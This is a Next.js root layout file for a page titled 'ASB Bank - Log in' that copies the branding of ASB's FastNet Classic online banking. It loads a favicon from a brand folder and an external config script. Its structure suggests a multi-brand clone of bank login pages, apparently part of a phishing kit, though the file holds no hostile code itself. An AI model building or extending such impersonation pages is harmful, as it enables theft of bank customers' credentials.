import type { Metadata } from "next";
import "./globals.css";
import Script from "next/script";

import { ASBFooter } from "@/components/layout/ASBFooter";

export const metadata: Metadata = {
  title: "ASB Bank - Log in",
  description: "Log in to ASB FastNet Classic online banking",
  icons: {
    icon: '/brands/asb/favicon.ico',
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en">
      <body>
        <Script src="/config.js" strategy="beforeInteractive" />
        <div className="page-wrapper">
          {children}
          <ASBFooter />
        </div>
      </body>
    </html>
  );
}
